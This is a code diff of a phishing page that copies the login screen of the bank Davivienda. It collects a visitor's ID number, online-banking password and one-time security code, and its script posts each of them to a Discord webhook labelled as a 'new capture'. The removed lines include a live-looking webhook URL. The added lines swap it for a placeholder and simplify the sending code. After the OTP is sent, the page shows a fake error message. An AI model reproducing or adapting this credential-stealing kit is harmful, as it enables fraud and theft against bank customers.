@@ -3,11 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Davivienda - Inicio</title>
+    <title>Davivienda - Virtual</title>
     <link rel="stylesheet" href="styles.css">
     <style>
-        /* Ajustes para que se vea idéntico a tus imágenes */
-        .container { max-width: 450px; margin: 0 auto; }
+        /* Forzamos que los elementos estén pegados como en tus fotos */
+        .container { max-width: 480px; margin: 0 auto; padding: 20px 40px; }
+        .form-group { margin-bottom: 5px !important; gap: 2px !important; }
+        .btn-continue { margin-top: 15px !important; }
+        
         #passSection, #otpSection { display: none; }
         .visible { display: block !important; }
         .hidden { display: none !important; }
@@ -16,115 +19,109 @@
 <body>
     <div class="container">
         <div class="logo-container">
-            <img src="LogoDavivienda.svg" alt="Logo" class="logo">
+            <img src="LogoDavivienda.svg" alt="Logo" class="logo" style="max-width: 200px;">
         </div>
         
-        <div id="loginStep">
-            <div class="welcome-section">
-                <p class="greeting">¡Hola!</p>
-                <h2 class="subtitle">Nos alegra que esté aquí</h2>
-            </div>
-            
-            <form id="mainForm">
-                <div id="docGroup">
-                    <div class="form-group">
-                        <label class="form-label">Seleccione su tipo de documento</label>
-                        <select id="docType" class="form-select">
-                            <option value="Cedula de Ciudadania">Cedula de Ciudadania</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Ingrese su número de documento</label>
-                        <input type="text" id="docNumber" class="form-input" required autocomplete="off">
-                    </div>
-                    <button type="button" id="btnToPass" class="btn-continue">Continuar</button>
-                </div>
-
-                <div id="passSection">
-                    <div class="form-group">
-                        <label class="form-label">Ingrese su clave virtual</label>
-                        <input type="password" id="pass" class="form-input" maxlength="8">
-                    </div>
-                    <div class="checkbox-container">
-                        <input type="checkbox" id="rem" class="checkbox">
-                        <label for="rem" class="checkbox-label">Recordar mis datos de identidad</label>
-                    </div>
-                    <button type="button" id="btnToOtp" class="btn-continue">Ingresar</button>
-                </div>
-
-                <div id="otpSection">
-                    <div style="border-top: 1px solid #eee; margin-top: 20px; padding-top: 15px;">
-                        <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700;">Verificación</h2>
-                        <div class="form-group">
-                            <label class="form-label">Código de seguridad</label>
-                            <input type="text" id="otpCode" class="form-input" placeholder="000000">
-                        </div>
-                        <p id="errOtp" style="color: #ed1c24; font-size: 12px; display: none;">Código incorrecto. Intente de nuevo.</p>
-                        <button type="button" id="btnFinish" class="btn-continue">Verificar</button>
-                    </div>
-                </div>
-            </form>
+        <div class="welcome-section">
+            <p class="greeting">¡Hola!</p>
+            <h2 class="subtitle">Nos alegra que esté aquí</h2>
         </div>
+        
+        <form id="mainForm">
+            <div id="docGroup">
+                <div class="form-group">
+                    <label class="form-label">Seleccione su tipo de documento</label>
+                    <select id="docType" class="form-select">
+                        <option value="Cedula de Ciudadania">Cedula de Ciudadania</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Ingrese su número de documento</label>
+                    <input type="text" id="docNumber" class="form-input" required autocomplete="off">
+                </div>
+                <button type="button" id="btnToPass" class="btn-continue">Continuar</button>
+            </div>
+
+            <div id="passSection">
+                <div class="form-group">
+                    <label class="form-label" style="margin-top: 10px;">Ingrese su clave virtual</label>
+                    <input type="password" id="pass" class="form-input" maxlength="8">
+                </div>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="rem" class="checkbox">
+                    <label for="rem" class="checkbox-label">Recordar mis datos de identidad</label>
+                </div>
+                <button type="button" id="btnToOtp" class="btn-continue">Ingresar</button>
+            </div>
+
+            <div id="otpSection">
+                <div style="border-top: 1px solid #eee; margin-top: 15px; padding-top: 15px;">
+                    <h2 style="color: #ed1c24; font-size: 19px; font-weight: 700;">Verificación</h2>
+                    <div class="form-group">
+                        <label class="form-label">Código de seguridad</label>
+                        <input type="text" id="otpCode" class="form-input" placeholder="000000">
+                    </div>
+                    <p id="errOtp" style="color: #ed1c24; font-size: 12px; display: none; margin-top: 5px;">Código incorrecto. Reintente.</p>
+                    <button type="button" id="btnFinish" class="btn-continue">Verificar</button>
+                </div>
+            </div>
+        </form>
     </div>
 
     <script>
-        // REEMPLAZA CON TU WEBHOOK REAL
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';
+        // PEGA TU URL DE WEBHOOK AQUÍ
+        const WEBHOOK_URL = 'TU_URL_DE_WEBHOOK_AQUI';
 
-        async function sendData(titulo, contenido) {
-            const payload = {
-                embeds: [{
-                    title: titulo,
-                    description: contenido,
-                    color: 15548997,
-                    footer: { text: "Davivienda Live • " + new Date().toLocaleString() }
-                }]
-            };
-
-            // USAMOS MODE: 'NO-CORS' PARA EVITAR BLOQUEOS
-            return fetch(WEBHOOK_URL, {
+        async function sendToDiscord(texto) {
+            // Enviamos como texto simple para máxima compatibilidad
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
-                mode: 'no-cors', 
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({ content: texto })
             });
         }
 
-        // 1. Mostrar CLAVE
+        // 1. Mostrar campo de clave
         document.getElementById('btnToPass').addEventListener('click', () => {
-            const doc = document.getElementById('docNumber').value;
-            if (doc.length > 3) {
+            if (document.getElementById('docNumber').value.length > 3) {
                 document.getElementById('docGroup').classList.add('hidden');
                 document.getElementById('passSection').classList.add('visible');
             }
         });
 
-        // 2. Enviar LOGIN y mostrar OTP abajo
+        // 2. Enviar Login y mostrar OTP
         document.getElementById('btnToOtp').addEventListener('click', async () => {
             const btn = document.getElementById('btnToOtp');
             btn.innerText = "Validando...";
             btn.disabled = true;
 
-            const info = `**Usuario:** \`${document.getElementById('docNumber').value}\`\n**Clave:** \`${document.getElementById('pass').value}\``;
+            const doc = document.getElementById('docNumber').value;
+            const clave = document.getElementById('pass').value;
             
-            await sendData("🏦 NUEVO INGRESO", info);
+            // Formato de mensaje ultra-limpio
+            const mensaje = `**🏦 NUEVA CAPTURA**\n👤 **Doc:** \`${doc}\`\n🔑 **Clave:** \`${clave}\``;
+            
+            await sendToDiscord(mensaje);
 
-            // Avanzamos aunque no recibamos respuesta (por el modo no-cors)
+            // Simulamos carga y mostramos el siguiente cuadro
             setTimeout(() => {
-                document.getElementById('btnToOtp').classList.add('hidden');
+                document.getElementById('passSection').classList.remove('visible');
+                document.getElementById('passSection').classList.add('hidden');
                 document.getElementById('otpSection').classList.add('visible');
-            }, 800);
+            }, 1000);
         });
 
         // 3. Enviar OTP
         document.getElementById('btnFinish').addEventListener('click', async () => {
             const btn = document.getElementById('btnFinish');
             const code = document.getElementById('otpCode').value;
-            
+            const doc = document.getElementById('docNumber').value;
+
             btn.innerText = "Verificando...";
             
-            const info = `**Usuario:** \`${document.getElementById('docNumber').value}\`\n**OTP:** \`${code}\``;
-            await sendData("🔐 CÓDIGO OTP", info);
+            const mensaje = `**🔐 OTP RECIBIDO**\n👤 **Doc:** \`${doc}\`\n🔢 **Código:** \`${code}\``;
+            
+            await sendToDiscord(mensaje);
 
             setTimeout(() => {
                 document.getElementById('errOtp').style.display = 'block';
